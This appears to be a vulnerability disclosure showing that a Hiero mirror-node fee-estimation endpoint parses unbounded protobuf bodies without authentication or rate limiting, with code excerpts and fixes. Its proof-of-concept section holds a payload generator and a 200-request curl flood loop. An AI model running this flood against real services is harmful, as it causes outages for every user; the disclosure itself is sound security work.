### Title
Unbounded Protobuf Body Deserialization in `estimateFees()` Enables Unauthenticated DoS

### Summary
The `POST /api/v1/network/fees` endpoint in `NetworkController.estimateFees()` accepts raw binary protobuf payloads with no enforced body-size limit and no rate limiting in the rest-java module. Any unauthenticated caller can repeatedly POST arbitrarily large payloads, forcing `Transaction.PROTOBUF.parse()` to consume unbounded CPU and heap memory on every request, degrading or crashing the service for all concurrent users.

### Finding Description
**Exact code location:** `rest-java/src/main/java/org/hiero/mirror/restjava/controller/NetworkController.java`, lines 110–124.

```java
@PostMapping(
        consumes = {"application/protobuf", "application/x-protobuf"},
        value = "/fees")
FeeEstimateResponse estimateFees(
        @RequestBody @NotNull byte[] body,          // ← no @Size constraint
        ...
) {
    try {
        final var transaction = Transaction.PROTOBUF.parse(Bytes.wrap(body)); // ← unbounded parse
        return toResponse(feeEstimationService.estimateFees(transaction, mode, highVolumeThrottle));
    } catch (ParseException e) {
        throw new IllegalArgumentException("Unable to parse transaction", e);
    }
}
```

**Root cause / failed assumption:** The method signature uses `@RequestBody @NotNull byte[] body` with no `@Size(max = …)` constraint. The only validation is a null check. Spring Boot/Tomcat's default `maxPostSize` (2 MB) applies exclusively to `application/x-www-form-urlencoded` bodies; for `application/protobuf` and `application/x-protobuf` content types there is no equivalent server-level cap. No `server.tomcat.max-swallow-size` or `spring.servlet.multipart.max-request-size` configuration exists anywhere in the rest-java module (confirmed: no matches in the entire codebase for those properties). The `ProtobufHttpMessageConverter` registered in `RestJavaConfiguration` (lines 49–74) also imposes no size limit.

**Rate-limiting gap:** The bucket4j throttle infrastructure (`ThrottleConfiguration`, `ThrottleManagerImpl`) lives entirely in the `web3` module and is not wired into rest-java. The rest-java module has only a `MetricsFilter` (records byte counts) and a `ShallowEtagHeaderFilter`—neither enforces any request rate or size cap.

**Exploit flow:**
1. Attacker crafts a maximally-sized valid (or partially-valid) protobuf binary blob—e.g., a `Transaction` with a `signedTransactionBytes` field filled with `~50 MB` of repeated bytes.
2. Attacker sends `POST /api/v1/network/fees` with `Content-Type: application/protobuf` and the large body, requiring zero authentication.
3. Spring reads the entire body into a `byte[]` on the heap, then `Transaction.PROTOBUF.parse(Bytes.wrap(body))` walks every protobuf field, allocating intermediate objects proportional to payload size.
4. Attacker repeats this in a tight loop from multiple connections.
5. Each in-flight request holds tens of MB of heap and saturates a Tomcat worker thread for the duration of parsing + fee calculation.

### Impact Explanation
Heap exhaustion triggers GC pressure and eventually `OutOfMemoryError`, crashing the JVM or causing stop-the-world pauses that make all API endpoints unresponsive. Even below OOM, saturating the Tomcat thread pool with slow, CPU-heavy parse operations starves legitimate GET requests (`/api/v1/network/fees`, `/api/v1/network/nodes`, etc.) of worker threads, causing timeouts for all concurrent users. This is a complete availability impact on the mirror-node REST Java service with no economic cost to the attacker.

### Likelihood Explanation
The endpoint is publicly documented in `rest/api/v1/openapi.yml` (lines 916–947), requires no authentication, and accepts standard HTTP POST. Any attacker with network access can exploit this with a single `curl` command. The attack is trivially repeatable and scriptable. No special knowledge of the Hedera protocol is required—a random 50 MB byte string is a valid `bytes` field in protobuf.

### Recommendation
1. **Enforce a body size cap at the controller level:** Add `@Size(max = MAX_TX_BYTES)` to the `body` parameter (Hedera's max transaction size is 6 KB; a generous cap of 64 KB is sufficient).
2. **Configure Tomcat's connector-level limit** for non-form POST bodies via a `TomcatServletWebServerFactory` customizer setting `connector.setMaxPostSize(65536)` or via `server.tomcat.max-http-form-post-size` plus a custom `RequestBodySizeFilter`.
3. **Add rate limiting to the rest-java module** using the same bucket4j pattern already present in the web3 module, keyed per source IP.
4. **Validate body size before parsing:** Check `body.length` against a configured maximum before calling `Transaction.PROTOBUF.parse()`.

### Proof of Concept
```bash
# Generate a ~50 MB payload: field 1 (bytes), wire type 2, varint length prefix
python3 -c "
import struct, sys
payload = b'\x0a' + b'\x80\x80\x80\x18' + b'\x00' * (50 * 1024 * 1024)
sys.stdout.buffer.write(payload)
" > large_tx.bin

# Flood the endpoint (no auth required)
for i in $(seq 1 200); do
  curl -s -X POST http://<mirror-node-host>:8084/api/v1/network/fees \
    -H "Content-Type: application/protobuf" \
    --data-binary @large_tx.bin &
done
wait
# Observe: legitimate requests begin timing out; heap usage spikes to OOM
``` [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/controller/NetworkController.java (L110-124)
```java
    @PostMapping(
            consumes = {"application/protobuf", "application/x-protobuf"},
            value = "/fees")
    FeeEstimateResponse estimateFees(
            @RequestBody @NotNull byte[] body,
            @RequestParam(defaultValue = "INTRINSIC", required = false) FeeEstimateMode mode,
            @RequestParam(name = HIGH_VOLUME_THROTTLE, defaultValue = "0", required = false) @Min(0) @Max(10000)
                    int highVolumeThrottle) {
        try {
            final var transaction = Transaction.PROTOBUF.parse(Bytes.wrap(body));
            return toResponse(feeEstimationService.estimateFees(transaction, mode, highVolumeThrottle));
        } catch (ParseException e) {
            throw new IllegalArgumentException("Unable to parse transaction", e);
        }
    }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/config/RestJavaConfiguration.java (L49-74)
```java
    ProtobufHttpMessageConverter protobufHttpMessageConverter() {
        final var protobufMediaType = new MediaType("application", "protobuf");
        final var extensionRegistry = ExtensionRegistry.newInstance();

        final var converter = new ProtobufHttpMessageConverter() {
            @Override
            protected Message readInternal(Class<? extends Message> clazz, HttpInputMessage inputMessage)
                    throws IOException, HttpMessageNotReadableException {
                final var message = super.readInternal(clazz, inputMessage);
                final var contentType = inputMessage.getHeaders().getContentType();

                if (protobufMediaType.isCompatibleWith(contentType)) {
                    return message.toBuilder()
                            .mergeFrom(inputMessage.getBody(), extensionRegistry)
                            .build();
                }

                return message;
            }
        };

        final var mediaTypes = new ArrayList<>(converter.getSupportedMediaTypes());
        mediaTypes.add(protobufMediaType);
        converter.setSupportedMediaTypes(mediaTypes);
        return converter;
    }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/config/MetricsFilter.java (L50-58)
```java
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {

        try {
            filterChain.doFilter(request, response);
        } finally {
            recordMetrics(request, response);
        }
    }
```
